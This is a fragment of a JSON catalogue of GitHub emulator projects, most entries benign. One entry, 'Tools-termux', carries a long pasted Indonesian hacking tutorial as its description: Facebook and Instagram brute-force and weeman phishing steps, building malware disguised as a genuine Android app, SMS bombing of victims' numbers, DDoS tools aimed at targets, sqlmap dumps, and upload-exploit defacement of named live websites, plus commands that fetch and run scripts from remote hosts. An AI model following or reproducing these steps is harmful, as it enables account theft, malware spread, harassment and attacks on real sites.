+    "description": "Sumi | The latest, best and especially most performant Nintendo Switch emulator! Run Nintendo Switch titles on your Android, Windows, Mac and Linux devices :)"
+  },
+  {
+    "name": "chomper",
+    "slug": "chomper",
+    "creator": "sledgeh4w",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/sledgeh4w/chomper",
+    "cover": "https://avatars.githubusercontent.com/u/36655200?v=4",
+    "description": "A lightweight emulation framework for emulating security algorithms in iOS executables and libraries."
+  },
+  {
+    "name": "6502Emulator",
+    "slug": "6502emulator",
+    "creator": "davepoo",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/davepoo/6502Emulator",
+    "cover": "https://avatars.githubusercontent.com/u/7448672?v=4",
+    "description": "Learning how a CPU works by emulating one"
+  },
+  {
+    "name": "uvm",
+    "slug": "uvm",
+    "creator": "maximecb",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/maximecb/uvm",
+    "cover": "https://avatars.githubusercontent.com/u/713766?v=4",
+    "description": "Fun, portable, minimalistic virtual machine."
+  },
+  {
+    "name": "idaemu",
+    "slug": "idaemu",
+    "creator": "36hours",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/36hours/idaemu",
+    "cover": "https://avatars.githubusercontent.com/u/15320601?v=4",
+    "description": "idaemu is an IDA Pro Plugin - use for emulating code in IDA Pro."
+  },
+  {
+    "name": "rustation",
+    "slug": "rustation",
+    "creator": "simias",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/simias/rustation",
+    "cover": "https://avatars.githubusercontent.com/u/7925386?v=4",
+    "description": "Playstation emulator in the Rust programing language"
+  },
+  {
+    "name": "Avocado",
+    "slug": "avocado",
+    "creator": "JaCzekanski",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/JaCzekanski/Avocado",
+    "cover": "https://avatars.githubusercontent.com/u/3662990?v=4",
+    "description": "🥑 PlayStation 1 emulator"
+  },
+  {
+    "name": "BrutDroid",
+    "slug": "brutdroid",
+    "creator": "Brut-Security",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Brut-Security/BrutDroid",
+    "cover": "https://avatars.githubusercontent.com/u/172168319?v=4",
+    "description": "BrutDroid - Android Studio Pentest Automator: Streamline mobile pentesting with automated emulator rooting, Frida, and Burp Suite integration."
+  },
+  {
+    "name": "citra_android",
+    "slug": "citra-android",
+    "creator": "SachinVin",
+    "version": "...",
+    "console": "Android",
+    "url": "https://github.com/SachinVin/citra_android",
+    "cover": "https://avatars.githubusercontent.com/u/26602104?v=4",
+    "description": "An Android frontend for the Citra Emulator "
+  },
+  {
+    "name": "Av3Emulator",
+    "slug": "av3emulator",
+    "creator": "lyuma",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/lyuma/Av3Emulator",
+    "cover": "https://avatars.githubusercontent.com/u/39946030?v=4",
+    "description": "Emulator for VRChat's Avatars 3.0 system, built on the Unity PlayableGraph API"
+  },
+  {
+    "name": "Supermodel",
+    "slug": "supermodel",
+    "creator": "trzy",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/trzy/Supermodel",
+    "cover": "https://avatars.githubusercontent.com/u/1285573?v=4",
+    "description": "Official repository of the Sega Model 3 arcade emulator."
+  },
+  {
+    "name": "plastic",
+    "slug": "plastic",
+    "creator": "Amjad50",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Amjad50/plastic",
+    "cover": "https://avatars.githubusercontent.com/u/26300843?v=4",
+    "description": "NES emulator in rust with egui and TUI"
+  },
+  {
+    "name": "Authorizer",
+    "slug": "authorizer",
+    "creator": "tejado",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/tejado/Authorizer",
+    "cover": "https://avatars.githubusercontent.com/u/3774136?v=4",
+    "description": "Authorizer is a Password Manager for Android. It emulates an HID keyboard over USB and enters your credentials on your target device. Additionally it supports OTP :key::mobile_phone_off:"
+  },
+  {
+    "name": "bmc64",
+    "slug": "bmc64",
+    "creator": "randyrossi",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/randyrossi/bmc64",
+    "cover": "https://avatars.githubusercontent.com/u/1160104?v=4",
+    "description": "A bare metal Commodore 64 emulator for the Raspberry Pi 1/2/3 with true 50hz/60hz smooth scrolling, low input latency and better audio/video sync."
+  },
+  {
+    "name": "switch-port-mods",
+    "slug": "switch-port-mods",
+    "creator": "StevensND",
+    "version": "...",
+    "console": "Nintendo Switch",
+    "url": "https://github.com/StevensND/switch-port-mods",
+    "cover": "https://avatars.githubusercontent.com/u/45856578?v=4",
+    "description": "Nintendo Switch Mods for some games. Mainly made + focus on Switch Emulators. This is my main mods repository. However don't forget to check the UE repository too."
+  },
+  {
+    "name": "Tools-termux",
+    "slug": "tools-termux",
+    "creator": "Taoviqinvicible",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Taoviqinvicible/Tools-termux",
+    "cover": "https://avatars.githubusercontent.com/u/45316440?v=4",
+    "description": "1.[Script Termux] -Cmatrix *apt-get update *apt-get upgrade *apt-get install nmap *apt-get install python *apt-get install list *apt-get install cmatrix *cmatrix  [1/11 18.28] ‪+62 821-2770-8489‬: ✓Mempercantik Termux $ pkg update && pkg upgrade $ pkg install ruby cowsay toilet figlet $ pkg install neofetch $ pkg install nano $ gem install lolcat  $ cd ../usr/etc $ nano bash.bashrc cowsay -f eyes Cyber | lolcat toilet -f standard Indonesia -F gay neofetch date | lolcat  Hack FB rombongan $ apt update && apt upgrade $ pkg install python2 git $ pip2 install mechanize $ git clone http://github.com/pirmansx/mbf $ ls $ cd mbf $ python2 MBF.py  Hack FB ngincer $ apt update ( Enter ) $ apt upgrade ( Enter ) $ apt install python2 ( Enter ) $ pip2 install urllib3 chardet certifi idna requests ( Enter ) $ apt install openssl curl ( Enter ) $ pkg install libcurl ( Enter ) $ ln /sdcard ( Enter )  $ cd /sdcard ( Enter ) $ python2 fbbrute.py ( Enter )  Hack Gmail apt-get update && apt-get upgrade $ apt-get install git $ apt-get install python python-pip python-setuptools $ pip install scapy $ git clone https://github.com/wifiphisher/wifiphisher.git $ cd wifiphisher< $ python setup.py install $ cd wifiphisher $ python wifiphisher   Nih yang mau hack WiFi Khusus root $apt update $apt upgrade $apt install git $git clone https://github.com/esc0rtd3w/wifi-hacker $ls $cd wifi-hacker $ls $chmod +x wifi-hacker.sh $ls $./wifi-hacker.sh ✓ *ni tutor dari gua*                  TOOL TERMUX LENGKAP  ⭕⭕⭕⭕⭕⭕⭕⭕⭕⭕⭕⭕⭕⭕              Command Termux Hacking......                          by:🎭ঔৣஓMuslimCyberSquadঔৣஓீ🎭  ⭕⭕⭕⭕⭕⭕⭕⭕⭕⭕⭕⭕⭕⭕   cara uninstall tool termux  rm -rf toolsnya   Bermain moon-buggy $ pkg install moon-buggy $ moon-buggy  CHATTING VIA TERMUX irssi  /connet irc.freenode.net /nick w3wandroid /join #modol   $ pkg install irssi $ irssi $ /connect chat.freenode.net $ /nick 1235 12345 di ganti sesuai nama/nick agan $ /join #XCAteam   PERKIRAAN cuaca curl http://wttr.in/ (lokasi)    Browsing di termux $ pkg install w3m $ w3m www.google.com Linknya bsa diubah   Telephone di termux $ pkg install termux-api $ termux-telephony-call nomornya   Menampilkan animasi kereta :v $ pkg install sl $ sl menampilkan ikon dan informasi sistem android $ pkg install neofetch $ neofetch  menampilkan teks dalam format ASCII $ pkg install figlet $ figlet masukin teksnya   MEMUTAR MUSIC DI YOUTUBE  VIA  TERMUX $ pip install mps_youtube $ pip install youtube_dl $ apt install mpv $ mpsyt $ /judul lagu Tinggal pilih lagu dengan mengetik nomornya  musikan di termux $ pkg install mpv  $ mpv/sdcard/lagu.mp3  /sdcard/ bisa di ganti sesuai letak music    CRACK PASSWORD HASH $ git clone https://github.com/FajriHidayat088/FHX-Hash-Killer/ $ cd FHX-Hash-Killer $ python2 FHXHashKiller.py  $ git clone https://github.com/UltimateHackers/Hash-Buster $ cd Hash-Buster $ python2 hash.py   ASCII ART MAPS​​​ - pkg install update && upgrade - pkg install perl - git clone https://github.com/x-xsystm/maps.git - cd maps - perl maps.pl - untuk Zoom tekan ​A​ - Password: ​(pejuang212)​   CARA MENGHIAS  TAMPILAN TERMUX TOXIC TEAM $ pkg update && pkg upgrade $ pkg install ruby cowsay toilet figlet $ pkg install neofetch $ pkg install nano $ pkg install ncurses-utils $ pkg install ruby $ pkg install lolcat $ pkg install cowsay $ gem install lolcat $ nano .bashrc  clear blue='\\e[1;34m' green='\\e[1;32m' purple='\\e[1;35m' cyan='\\e[1;36m' red='\\e[1;31m' white='\\e[1;37m' yellow='\\e[1;33m' NOW=`date \"+%d.%m.%Y\"` TIME=`date \"+%H:%M\"` cowsay -f eyes **Welcome To TOXIC hacking tool** | lolcat toilet -f standard \" **TOXIC** \" -F gay neofetch echo \" Time : \" $TIME | lolcat date | lolcat echo echo  Username : Cyber | lolcat echo  Hostname : TOXIC | lolcat echo echo @localhost:~# | lolcat echo root@localhost:~$ | lolcat echo -e $green echo root@CYBER:~$   TUTORIAL  MEMBUAT VIRUS SEPERTI APLIKASI ASLINYA  Tools yang dibutuhkan: APK Editor & tool vbug APK Editor bisa didownload di playstore Tool vbug https://www.mediafire.com/file/6hs6y71ryw10uvw/vbug.zip 1. Download tool vbugnya dulu 2. Taruh file tool vbug di luar folder pada memori internal 3. Buka termux lalu $ cd /sdcard 4. $ unzip vbug.zip 5. $ cd vbug 6. $ python2 vbug.py 7. Enter 8. Ketik 10 9. Ketik E 10. Aplikasi virusnya sudah jadi Setelah aplikasinya jad kita tinggal edit supaya mirip aslinya 1. Buka APK Editor 2. Klik Select an Apk File 3. Pilih aplikasi virus tadi 4. Klik full edit 5. Pada bagian kolom app_name tulis nama aplikasi yang kalian inginkan 6. Lalu klik files 7. Klik res/drawable 8. Logo yang kedua itu ganti dengan logo aplikasi yang kalian inginkan Catatan: format logo harus .png 9. Ceklist logo yang kedua lalu replace 10. Pilih file logo yang mau dijadikan logo aplikasi agan 11. Back sampai home Supaya aplikasi terlihat lebih nyata kita harus beri bobot pada aplikasi buatan kita 12. Klik tanda plus yang ada di bawah kiri, pilih file, lagu, gambar atau apapun yang coxok sebagai bobot apliaksi agan 13. Klik build 14. Tunggu hingga selesai 15. Jadi deh  VBugMaker Termux -apt update && apt upgrade -apt install git -apt install python Donwload file ->http://upfile.mobi/YGwg8gQLuvv Pindah ke directory Next -unzip vbug.zip -mv vbug $HOME -cd vbug -ls -chmod +x vbug.py -python2 vbug.py #Done    BOOM SPAM DI TERMUX apt upgrade && apt update apt install git  git clone https://github.com/Amriez/gcospam cd gcospam sh install.sh sh gco.sh Pilih nomer yang mana ajjh  Lalu Masukan nomer tanpa 0/62 Input bebas Jeda default aja  Spam bom mall $ pkg install update  $ pkg install upgrade $ pkg install wget $ pkg install php $ wget http://files-store.theprivat.ml/uploads/bom-mall.zip $ unzip bom-mall.zip $ cd bom-mall $ php run.php  (Install *SpamTsel*) $ pkg install curl  $ pkg install php  $ curl -s http://files-store.theprivat.ml/uploads/bombtsel.txt > bombtsel.php  $ chmod 777 bombtsel.php $ php bombtsel.php 3) Tool Spam LITESPAM $ pkg install php $ pkg install toilet $ pkg install sh  LITESPAM $ pkg install git $ git clone https://github.com/4L13199/LITESPAM $ cd LITESPAM $  sh LITESPAM.sh atau   bash LITESPAM.sh Masukan Nomer nya...   Spammer GRAB $pkg install python2 $pip2 install requests $pkg install git $git clone http://github.com/p4kl0nc4t/Spammer-Grab $cd Spammer-Grab $python2 spammer.py nomor hp korban --delay 30  ‌spam sms jdid 1.PKG install PHP 2.pkg install cURL 3.curl https://pastebin.com/raw/9BYy1 JVc -o jdid.php 4.php jdid.php   Hacking spammer by seni $apt update && apt upgrade $apt install python2 php $pip2 install requests $apt install nano $apt install git $git clone https://github.com/Senitopeng/ SpamSms.git $cd SpamSms $python2 mantan.py   HACKING DAN TRICK FB VIA TERMUX   AUTO BOOT FACEBOOK  $ git clone https://github.com/Senitopeng/BotFbBangDjon.git $ cd BotFbBangDjon $ python2 bangdjon.py  Cara crack id fb   https://findmyfbid.in/  git clone https://github.com/tomiashari/fb-autoreaction.git cd fb-autoreaction python2 fb-autoreaction  HACKING THOOLS MBF FACEBOOK $ pkg update && upgrade ‬$ pkg update && upgrade $ pkg install python2 $ pkg install git $ git clone https://github.com/pirmansx/mbf $ cd mbf $ python2 MBF.py  (HACKING FB LEWAT TERMUX) $ apt update $ apt upgrade  $ apt install python2 $ apt install python2-dev $ apt install wget $ dip2 install mechanize $ cd/sterage/emulated/0 $ python2 fbbrute.py ( yg tdi di download  di tunda di luar folder ) $ storage/emulated/0/fassword.txt ( sama kya yang tadi di download trus tinda di luar folder ) =tinggal tunggu fassword nya muncul Jika beruntung  BRUTEFORCE  $ apt update $ apt upgrade $ apt install python $ apt install pip $ pip install wordlist $ apt install worlist $ Wordlist -h $ cd /sdcard $ Cat pas.txt  FACEBOOK BRUTO FORCE $ apt update   $ apt upgrade  $ apt install python2  $ apt install python2-dev  $ apt install wget  $ pip2 install mechanize $ cd/storage/emulated/0 $ python2 fbbrute.py $ storage/emulated/0/password.txt  Hacking tool weeman $ apt-get update $ apt-get upgrade $ pkg install python2 $ pkg install git $ git clone https://github.com/evait-security/weeman.git $ ls $ cd weeman $ ls  $ python2 weeman.py $ show $set url https://www.facebook.com $set action_url https://www.facebook.com $ show buka new season (new tab) /lembar ke 2 $ ifconfig jika slesai copy no addres yg tertera. jngn sampai salah karna ada 2 addres disitu. jika tdk tau yg mna tanya. stelah copy no adres.  buka lembar pertama lagi tulis  $ run kasih adres tdi ke target. contoh 125.25.175.88:8080 ingt hrus ksh port > :8080 jika sudah dibuka dngn dia. saat dia login nnti. email. pass. tertera. serta data\" akun target....  hacking fbbrute2 by decsec $ apt update (enter) $ apt upgrade (enter) $ apt install python2 (enter) $ apt install wget (enter) $ pip2 install mechanize (enter) $ cd /sdcard (enter) $ mkdir facebrute (enter) $ cd facebrute (enter) $ wget http://override.waper.co/files/facebook.apk $ wget http://override.waper.co/files/password.apk $ mv facebook.apk facebook.py (enter) $ mv password.apk password.txt (enter) $ python2 facebook.py (enter) #Selesai *note: Untuk masalah wordlist bisa buat sendiri              kok ^^. Buat sendiri lebih efektif...  hacking fbbrute3 $ Apt update ( Enter ) $ Apt upgrade ( Enter ) $ Apt install python2 ( Enter ) $ Pip2 install urllib3 chardet certifi idna requests( Enter ) $ Apt install openssl curl ( Enter ) $ Pkg install libcurl ( Enter ) $ Ln -s/sdcard ( Enter ) $ cd sdcard ( Enter ) $ Python2 fb.py ( Enter )  Hacking Botkomena fb $pkg update && pkg upgrade $pkg install git $pkg install python2 $pip2 install mechanize $git clone https://github.com/Senitopeng/ Botkomena.git $cd Botkomena $python2 botkomena.py   Cara Install OSIF ( Open Source Information Facebook )  $ pkg install python2  $ git clone https://github.com/ciku370/OSIF  $ cd OSIF  $ pip2 install -r requirements.txt Dan cara menjalankannya menggunakan perintah :  python2 osif.py     weemen 1.download dulu termux 2.instal termux :V 3.ketik apt install git python2 4.ketik git clone https://github.com/evait-security/weeman.git 5.ketik cd weeman 6.ketik python2 weeman.py kalau udh ke install seperti ini 1.ketik set url https://m.facebook.com 2.ketik set action_url https://m.facebook.com/login 3.ketik run Kalau sudah begini . ketik 127.0.0.1:8080 pada browser maka web pishing yg di buat tadi sudah jadi lalu lemparkan ke target link 127.0.0.1:8080 lalu kalau korban terjebak , di mana email dan password nya ? masuk dalam termux jangan di tutup weeman tidak hanya dapat di gunakan sebagai media pishing facebook saja. kita juga dapat membuat web pishing situs lainya misalnya twitter instagram dll asal memiliki/terdapat form input  Hacking instagram $ apt update && apt upgrade -y $ apt install nodejs git $ cd Instagram-Private-Tools $ node index.js $ git clone https://github.com/ccocot/Instagram-Private-Tools.git $ npm install  *HACK INSTAGRAM* ( sosial engineering) $ apt update && apt upgrade $ pkg install python $ pkg install git $ pkg install nano $ git clone https://github.com/avramit/instahack.git $ ls $ cd instahack $ ls $ pip install requests $ cd instahack $ nano pass.txt $ cat pass.txt $ ls $ python hackinsta.py  Localizar ip Apt install python git git clone https://github.com/maldevel/IPGeoLocation.git cd IPGeoLocation chmod +x ipgeoLocation.py pip install -r requirements.txt python ipgeolocation.py -m python ipgeolocation.py -t http://www.google.com  Lacak IP git clone https://github.com/maldevel/IPGeolocation cd IPGeolocation chmod +x ipgeolocation.py pip install -r requirements.txt python ipgeolocation.py -m python ipgeolocation.py -t IP yang ingin dilacak   TOOL DDOS VIA TERMUX 1. Hammer $ pkg update (tekan enter) $ pkg upgrade (tekan enter) $ pkg install python (tekan enter) $ pkg install git (tekan enter) $ git clone https://github.com/cyweb/hammer (tekan enter) $ cd hammer (tekan enter) $ python hammer.py (tekan enter) $ python hammer.py -s [IP target] -p [port] -t 135 (tekan enter)     2. Xerxes $ apt install git $ apt install clang $ git clone https://github.com/zanyarjamal/xerxes $ ls $ cd xerxes $ ls $ clang xerxes.c -o xerxes $ ls $ ./xerxes (nama website) 80  3. Torshammer $ pkg update $ pkg install git $ apt install tor $ pkg install python2 $ git clone https://github.com/dotfighter/torshammer.git $ ls  $ cd torshammer $ python2 torshammer.py  4. liteDDOS $ apt update $ apt upgrade $ pkg install git $ pkg install python2 $ git clone https://github.com/4L13199/LITEDDOS $ cd LITEDDOS $ python2 liteDDOS.py   RED_HAWK tool $ apt update $ apt install git $ git clone https://github.com/Tuhinshubhra/RED_HAWK $ cd RED_HAWK $ chmod +x rhawk.php $ apt install php $ ls $ php rhawk.php   ‌```Install webdav ``` $ apt update && upgrade  $ apt install python2  $ pip2 install urllib3 chardet certifi idna requests  $ apt install openssl curl  $ pkg install libcurl  $ ln -s /sdcard  $ cd sdcard  $ mkdir webdav  $ cd webdav   ‌Tutorial Install *Tools-B4J1N64Nv5* pkg install update pkg install git pkg install toilet pkg install figlet pip2 install lolcat git clone https://github.com/DarknessCyberTeam/B4J1N64Nv5 cd B4J1N64Nv5 sh B4J1N64N.sh  ‌cara install termux ubuntu - apt update/pkg update - apt upgrade/pkg upgrade - pkg install git - pkg install proot - pkg install wget - git clone https://github.com/Neo-Oli/termux-ubuntu - cd termux-ubuntu - chmod +x ubuntu.sh - pip install -r requirements.txt - ./ubuntu.sh Untuk menjalankan - ./start.sh  Cara install github tembak XL Dari awal  1.pkg upgrade 2.pkg update 3.pkg install git 4.pkg install python 5.git clone https://github.com/albertoanggi/xl-py 6.pip install -r requirements.txt 7.chmod +x app.py 8.python/python2 app.py  *Install admin finder in termux* $ apt update && apt upgrade $ pkg install python2 $ pkg install git $ git clone https://github.com/AdheBolo/AdminFinder *Menjalankan* $ ls $ cd AdminFinder $ chmod 777 AdminFinder.py $ python2 AdminFinder.py  *Cara install tool Mr.Rv1.1* $apt update && apt upgrade $pkg install git $pkg install gem $pkg install figlet $gem install lolcat $git clone https://github.com/Mr-R225/Mr.Rv1.1 $cd Mr.Rv1.1 $sh Mr.Rv1.1.sh  tool install $ apt update && apt upgrade $ apt install git $ git clone https://github.com/aryanrtm/4wsectools cd 4wsectools chmod 777 tools ./tools  TOOL FSOCIETY $ git clone https://github.com/manisso/fsociety $ cd fsociety $ ./install.sh $ ls $ python2 fsociety.py  SQLMAP  apt update apt install python apt install python2 apt install git git clone https://github.com/sqlmapproject/sqlmap https://github.com/sqlmapproject/sqlmap.git cd sqlmap Python2 sqlmap.py  Exemplo Python2 sqlmap.py -u website –dbs -D acuart –tables -D acuart -T users –columns -D acuart -T users -C name,email,phone -dump  BUSCA PAINEL ADM DE SITE pkg install git git clone https://github.com/Techzindia/admin_penal cd admin_penal chmod +x admin_panel_finder.py python2 admin_panel_finder.py  HAKKU apt install pytho apt install git mkdir vasu git clone https://github.com/4shadoww/hakkuframework cd hakkuframework chmod +x hakku python hakku show modules use whois show options set target examplesite.com run  TOOL D-TECT apt update apt install git git clone https://github.com/shawarkhanethicalhacker/D-TECT cd D-TECT apt install python2 chmod +x d-tect.py python2 d-tect.py examplesite.com  viSQL apt update apt install python2 apt install git git clone https://github.com/blackvkng/viSQL cd viSQL python2 -m pip install -r requirements.txt python2 viSQL.py python2 viSQL.py -t http://www.bible-history.com  Hash Buster apt update apt upgrade apt install python2 apt install git git clone https://github.com/UltimateHackers/Hash-Buster cd Hash-Buster python2 hash.py  tool ubuntu $ apt update $ apt install git $ apt install wget $ apt install proot $ git clone https://github.com/Neo-Oli/termux-ubu&#8230; $ cd termux-ubuntu $ chmod +x ubuntu.sh $ ./ubuntu.sh $ ./start.sh  (````Install``` *Hunner framework*)  $ apt update  $ apt install python $ apt install git -y $ git clone https://github.com/b3-v3r/Hunner $ cd Hunner $ chmod 777 hunner.py $ python hunner.py  *Cara Install Lazymux di Termux* $ pkg update && upgrade  $ pkg install python2  $ pkg install git  $ git clone https://github.com/Gameye98/Lazymux  $ cd Lazymux  $ chmod +x lazymux.py  $ python2 lazymux.py   Cara install tools daijobu* Fungsinya nanti liat sendiri lah di dalem tools nya  $apt upgrade && apt update  $apt install php  $apt install git  Kalo udah selesai langsung masukan git nya dengan perintah  $git clone https://github.com/alintamvanz/diejoubu  $cd diejoubu  $cd v1.2  $php diejoubu.php   Hecker RECONDOG apt update apt install python python2 apt install git git clone https://github.com/UltimateHackers/ReconDog cd ReconDog chmod +x dog.py Python2 dog.py    DEFACE Hacking Script-Deface $apt update $apt upgrade $apt install git $apt install python2 $git clone https://github.com/Ubaii/script-deface-creator $ls $cd script-deface-creator $ls $chmod +x create.py $ls $python2 create.py  done semoga bisa bikin script Html  CARA DEFACE  Cara1 Siapkan script sendiri..  1.buka browser kalian apa saja terserah lalu ke google 2.tulis dork nya berikut ini (inurl:\"sitefinity/login.aspx) tanpa tanda buka kurung dan tutup kurung! lalu search 3.pilih lah salah satu website terserah kalian,klik website nya lalu tambahkan exploit nya sebagai berikut (sitefinity/usercontrols/dialog/documenteditordialog.aspx) tanpa buka tutup kurung! E http://sitetarget*org/sitefinity/usercontrols/dialogs/documenteditordialog.aspx 4.lalu klik search kembali! nah disitu kalian klik chose file dan pilih script deface punya kalian 5.klik yang di bawah nya tunggu sampai loading selesai 6.tambah link target tadi dengan (/files) contoh http://sitetarget*org/files/namascriptdefacekalian.html lalu klik search 7.selesai!!  Cara2  Method/metode KCFinder Inurl:/kcfinder/browse.php Inurl:/Kcfinder/ Langsung saja upload file deface anda,lalu panggil dengan tambahan /file/namasckamu.html Contoh: https://basukiwater.com/kcfinder/browse.php jadi https://basukiwater.com/file/namasckamu.html  cara3  Deface Onion.to File Upload   Tutor ini sekarang lagi Ngtreend & Simple , tapi ingat ya bukan Deepweb melaikan Fake Deepweb hehehe... Mari kita Lanjut...  Dork : - inurl:/upload site:.onion.to            - intext:\"Upload\" site:.onion.to  Live : https://tt3j2x4k5ycaa5zt.onion.to/upload.php  Step By Step :  1. Dorking Dulu 2. Pilih Web Target 3. Pilih File yang mau di'upload 4. Tinggal klik Upload => Done 😆  Contoh Target :  https://tt3j2x4k5ycaa5zt.onion.to/uploads/lopeyou.html https://danwin1210.me/uploads/lopeyou.html https://temp.xn--wda.fr/e719x8JgJ.html  Mirror?! 😆 https://www.defacer.id/296011.html https://www.defacer.id/296024.html  cara4 Metode com media Bahan :  1. Dork : - inurl:com_media site:com             - inurl:com_media intext:\"Upload\"  2. Exploit : /index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=  3. Upload'an : Format .txt 😁 Live Target : http://www.james-insurance.co.uk/ Step by Step : gunakan Live Targert dulu untuk Uji Coba 😁 1. Masukkan dork : inurl:com_media intext:\"Upload\" site:co.uk 2. Pilih salah satu Web 3. Masukkan Exploit  http://www.james-insurance.co.uk/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder= 4. Lalu Upload file dalam tempat upload ( format .txt ) Akses shell ?  Tambahkan : /images/namafile.txt                        contoh : http://www.james-insurance.co.uk/images/fac.txt Nanti Jadi Gini Hasilnyaa.. Mudah Bukan?! Tinggal Upload ke Defacer.id 😁  cara5 [POC] Vulnerability Simplicity Of Upload  #Step 1: Dork: “Powered By: © Simplicity oF Upload” #Step 2: Exploit: http://[situstargetkamu]/PATH/upload.php *Tergantung dengan target. #Step 3: llowed file: gif, jpg, png, txt, php, asp, cgi, zip, exe, mp3, etc (not allowed for html) #Step 4: Preview: http://[situstargetkamu]/upload/[Your File] #Step 5: Live Demo: http://www.railfaneurope.net/pix/upload.php http://www.formplas.com/upload/upload.php *Di google masih banyak kok  Nah, saya kira cukup segitu aja kok, karena mudah tuh tutorial nya. Kalau masih ada yang bin [8/11 06.41] ‪+62 838-5688-2861‬: TOOL TERMUX Cara Install D-tect tool di android termux (command ) :  $ apt install git $ apt install python2 $ git clone https://github.com/shawarkhanethicalhacker/D-TECT $ ls $ cd  $ chmod +x d-tect.py $ python2 d-tect.py  cara uninstall tool termux  rm -rf toolsnya  cara buat virus cd /sdcard cd vbug ls chmod vbug.py chmod -v vbug.py python2 vbug.py  irssi /connet irc.freenode.net /nick w3wandroid /join #modol _________________________ DDOS via Termux   1. Hammer $ pkg update (tekan enter) $ pkg upgrade (tekan enter) $ pkg install python (tekan enter) $ pkg install git (tekan enter) $ git clone https://github.com/cyweb/hammer (tekan enter) $ cd hammer (tekan enter) $ python hammer.py (tekan enter) $ python hammer.py -s [IP target] -p [port] -t 135 (tekan enter)   104.27.146.125  2. Xerxes $ apt install git $ apt install clang $ git clone https://github.com/zanyarjamal/xerxes $ ls $ cd xerxes $ ls $ clang xerxes.c -o xerxes $ ls $ ./xerxes (nama website) 80  3. Torshammer $ pkg update $ pkg install git $ apt install tor $ pkg install python2 $ git clone https://github.com/dotfighter/torshammer.git $ ls  $ cd torshammer $ python2 torshammer.py  4. liteDDOS $ apt update $ apt upgrade $ pkg install git $ pkg install python2 $ git clone https://github.com/4L13199/LITEDDOS $ cd LITEDDOS $ python2 liteDDOS.py  _________________________________________ Bermain moon-buggy $ pkg install moon-buggy $ moon-buggy  ________________________________________ musikan di termux $ pkg install mpv  $ mpv/sdcard/lagu.mp3  /sdcard/ bisa di ganti sesuai letak musik  ________________________________________ Browsing di termux $ pkg install w3m $ w3m www.google.com Linknya bsa diubah  ________________________________________ Telephone di termux $ pkg install termux-api $ termux-telephony-call nomornya  _______________________________________ Menampilkan animasi kereta :v $ pkg install sl $ sl  _______________________________________ menampilkan ikon dan informasi sistem android $ pkg install neofetch $ neofetch  _______________________________________ menampilkan teks dalam format ASCII $ pkg install figlet $ figlet masukin teksnya  _______________________________________ $ pip install mps_youtube $ pip install youtube_dl $ apt install mpv $ mpsyt $ /judul lagu Tinggal pilih lagu dgn mengetik nomornya.                       ￼ Tutorial membuat virus seperti aplikasi aslinya🚨 Tools yang dibutuhkan: APK Editor & tool vbug APK Editor bisa didownload di playstore Tool vbug https://www.mediafire.com/file/6hs6y71ryw10uvw/vbug.zip  1. Download tool vbugnya dulu 2. Taruh file tool vbug di luar folder pada memori internal 3. Buka termux lalu $ cd /sdcard 4. $ unzip vbug.zip 5. $ cd vbug 6. $ python2 vbug.py 7. Enter 8. Ketik 10 9. Ketik E 10. Aplikasi virusnya sudah jadi Setelah aplikasinya jad kita tinggal edit supaya mirip aslinya 1. Buka APK Editor 2. Klik Select an Apk File 3. Pilih aplikasi virus tadi 4. Klik full edit 5. Pada bagian kolom app_name tulis nama aplikasi yang kalian inginkan 6. Lalu klik files 7. Klik res/drawable 8. Logo yang kedua itu ganti dengan logo aplikasi yang kalian inginkan Catatan: format logo harus .png 9. Ceklist logo yang kedua lalu replace 10. Pilih file logo yang mau dijadikan logo aplikasi agan 11. Back sampai home Supaya aplikasi terlihat lebih nyata kita harus beri bobot pada aplikasi buatan kita 12. Klik tanda plus yang ada di bawah kiri, pilih file, lagu, gambar atau apapun yang coxok sebagai bobot apliaksi agan 13. Klik build 14. Tunggu hingga selesai 15. Jadi deh  auto boot fb git clone https://github.com/Senitopeng/BotFbBangDjon.git cd BotFbBangDjon python2 bangdjon.py melihat id fb https://findmyfbid.in/  git clone https://github.com/tomiashari/fb-autoreaction.git  cd fb-autoreaction python2 fb-autoreaction  cara membuat virus cd Vbug/vbug.py cd /storage/emulated/0/Vbug cd vbug Python2 vbug.py  CRACK PASSWORD HASH git clone https://github.com/FajriHidayat088/FHX-Hash-Killer/ cd FHX-Hash-Killer python2 FHXHashKiller.py  git clone https://github.com/UltimateHackers/Hash-Buster $ cd Hash-Buster $ python2 hash.py  pkg install irssi irssi (enter) /connect chat.freenode.net /nick oki /join #mrmaze  Cara install Metasploit di termux (No Root) ~ apt update && apt upgrade ~ apt install curl ~ curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh ~ chmod +x metasploit.sh ~ ./metasploit.sh ... Tunggu proses instalasi sekitar 30-40 menit tergantung koneksi internet ...  ( hack fb via termux ) $apt update $apt upgrade  $apt install python2 $apt install python2-dev $apt install wget $dip2 install mechanize $cd/sterage/emulated/0 $python2 fbbrute.py ( yg tdi di download  di tunda di luar folder ) $storage/emulated/0/fassword.txt ( sama kya yang tadi di download trus tinda di luar folder ) =tinggal tunggu fassword nya muncul  Jika beruntung *silahkan mencoba*  tool install $ apt update && apt upgrade $ apt install git $ git clone https://github.com/aryanrtm/4wsectools cd 4wsectools chmod 777 tools ./tools  pip install mps_youtube pip install youtube_dl apt install mpv mpsyt /judul  $ pkg update && pkg upgrade CHATTING VIA TERMUX $ pkg install irssi $ irssi $ /connect chat.freenode.net $ /nick 1235 12345 di ganti sesuai nama/nick agan $ /join #XCAteam  100% work boom spam apt upgrade && apt update apt install git  git clone https://github.com/Amriez/gcospam cd gcospam sh install.sh sh gco.sh 